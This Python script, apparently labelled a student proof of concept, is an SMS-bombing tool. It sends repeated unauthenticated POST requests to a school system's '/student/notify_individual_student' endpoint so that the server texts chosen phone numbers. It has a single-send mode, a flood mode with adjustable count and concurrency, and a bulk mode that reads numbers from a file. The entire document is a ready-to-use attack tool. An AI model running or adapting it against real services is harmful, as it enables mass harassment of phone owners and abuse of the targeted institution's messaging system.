import sys
import time
import asyncio
import aiohttp
from tqdm import tqdm

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CYAN    = "\033[96m"
GREEN   = "\033[92m"
RED     = "\033[91m"
YELLOW  = "\033[93m"
MAGENTA = "\033[95m"
DIM     = "\033[90m"
BOLD    = "\033[1m"
RESET   = "\033[0m"

# ── banner ────────────────────────────────────────────────────────────────────

def _build_banner():
    title_lines_raw = [
        " ____  __  __ ____  ____   ___  __  __ ____  ",
        "/ ___||  \\/  / ___|| __ ) / _ \\|  \\/  | __ ) ",
        "\\___ \\| |\\/| \\___ \\|  _ \\| | | | |\\/| |  _ \\ ",
        " ___) | |  | |___) | |_) | |_| | |  | | |_) |",
        "|____/|_|  |_|____/|____/ \\___/|_|  |_|____/ ",
    ]
    title_lines = [f"{CYAN}{l}{RESET}" for l in title_lines_raw]

    art = [
        f"  {DIM}📱 → {CYAN}09xxxxxxxxx{RESET}",
        f"  {DIM}📱 → {CYAN}09xxxxxxxxx{RESET}",
        f"  {DIM}📱 → {CYAN}09xxxxxxxxx{RESET}",
        f"  {DIM}📱 → {CYAN}09xxxxxxxxx{RESET}",
        f"  {YELLOW}  ∞ no auth needed{RESET}",
    ]

    T = max(len(l) for l in title_lines_raw)
    top_pad    = [""] * 2
    bot_pad    = [""] * 2
    left_lines = top_pad + [f"{l}{' ' * (T - len(r))}" for l, r in zip(title_lines, title_lines_raw)] + bot_pad
    right_lines = [""] * 2 + art + [""] * 1

    out = ["\n"]
    for l, r in zip(left_lines, right_lines):
        out.append(f"  {l}   {r}")
    out.append(f"\n  {DIM}  unauthenticated SMS injection  ·  STUDENT POC ST-02{RESET}\n")
    return "\n".join(out)

print(_build_banner())

# ── inputs ────────────────────────────────────────────────────────────────────

try:
    BASE_URL  = input(f"  {CYAN}[?]{RESET} Target URL            : ").strip().rstrip("/")
    MODE      = input(f"  {CYAN}[?]{RESET} Mode — [1] single  [2] flood  [3] bulk from file: ").strip() or "1"
except KeyboardInterrupt:
    print(f"\n\n  {YELLOW}[!]{RESET} Aborted.")
    raise SystemExit(0)

ENDPOINT = f"{BASE_URL}/student/notify_individual_student"
HDRS     = {
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
}

# ── single send ───────────────────────────────────────────────────────────────

if MODE == "1":
    try:
        phone = input(f"  {CYAN}[?]{RESET} Phone number (09XXXXXXXXX): ").strip()
    except KeyboardInterrupt:
        print(f"\n  {YELLOW}[!]{RESET} Aborted.")
        sys.exit(0)
    import requests
    print(f"\n  {DIM}[>]{RESET} POST {ENDPOINT}")
    try:
        r = requests.post(ENDPOINT, data={"phone": phone}, headers=HDRS, timeout=10)
        sc = GREEN if r.status_code < 300 else RED
        print(f"  {DIM}[<]{RESET} {sc}{r.status_code}{RESET}")
        print(f"  {DIM}    {r.text[:300]}{RESET}")
    except Exception as e:
        print(f"  {RED}[!]{RESET} {e}")
    sys.exit(0)

# ── flood / bulk ──────────────────────────────────────────────────────────────

sent = 0
failed = 0

async def blast(session, sem, phone, pbar):
    global sent, failed
    async with sem:
        try:
            async with session.post(
                ENDPOINT,
                data={"phone": phone},
                timeout=aiohttp.ClientTimeout(total=8)
            ) as resp:
                text = await resp.text()
                sent += 1
                pbar.update(1)
                pbar.set_postfix(sent=sent, failed=failed)
                if "success" in text.lower():
                    tqdm.write(f"  {GREEN}[+]{RESET} SMS queued → {phone}")
        except Exception:
            failed += 1
            pbar.update(1)
            pbar.set_postfix(sent=sent, failed=failed)

async def run_flood(phones, count, delay, max_conc):
    sem = asyncio.Semaphore(max_conc)
    targets = phones * count if count > 1 else phones
    async with aiohttp.ClientSession(headers=HDRS) as session:
        with tqdm(total=len(targets), desc=f"  {CYAN}flooding{RESET}",
                  bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}]") as pbar:
            tasks = []
            for phone in targets:
                tasks.append(asyncio.create_task(blast(session, sem, phone, pbar)))
                if delay > 0:
                    await asyncio.sleep(delay)
            await asyncio.gather(*tasks, return_exceptions=True)

if MODE == "2":
    # Flood single number
    try:
        phone    = input(f"  {CYAN}[?]{RESET} Phone number (09XXXXXXXXX): ").strip()
        count    = int(input(f"  {CYAN}[?]{RESET} How many messages [10]  : ").strip() or "10")
        delay    = float(input(f"  {CYAN}[?]{RESET} Delay between sends [0] : ").strip() or "0")
        max_conc = int(input(f"  {CYAN}[?]{RESET} Concurrency [10]        : ").strip() or "10")
    except KeyboardInterrupt:
        print(f"\n  {YELLOW}[!]{RESET} Aborted.")
        sys.exit(0)

    print(f"\n  {YELLOW}[!]{RESET} Flooding {CYAN}{phone}{RESET} with {YELLOW}{count}{RESET} SMS messages\n")
    try:
        asyncio.run(run_flood([phone], count, delay, max_conc))
    except KeyboardInterrupt:
        print(f"\n  {YELLOW}[!]{RESET} Interrupted.")
    print(f"\n  {GREEN}[+]{RESET} Done — sent: {sent}  failed: {failed}")

elif MODE == "3":
    # Bulk from file
    try:
        fname    = input(f"  {CYAN}[?]{RESET} Phone list file (one per line): ").strip()
        count    = int(input(f"  {CYAN}[?]{RESET} Repeat each N times [1]       : ").strip() or "1")
        delay    = float(input(f"  {CYAN}[?]{RESET} Delay between sends [0]       : ").strip() or "0")
        max_conc = int(input(f"  {CYAN}[?]{RESET} Concurrency [20]              : ").strip() or "20")
    except KeyboardInterrupt:
        print(f"\n  {YELLOW}[!]{RESET} Aborted.")
        sys.exit(0)
    try:
        with open(fname) as f:
            phones = [l.strip() for l in f if l.strip()]
    except FileNotFoundError:
        print(f"  {RED}[!]{RESET} File not found: {fname}")
        sys.exit(1)
    print(f"\n  {YELLOW}[!]{RESET} {len(phones)} targets × {count} = {len(phones)*count} total SMS\n")
    try:
        asyncio.run(run_flood(phones, count, delay, max_conc))
    except KeyboardInterrupt:
        print(f"\n  {YELLOW}[!]{RESET} Interrupted.")
    print(f"\n  {GREEN}[+]{RESET} Done — sent: {sent}  failed: {failed}")
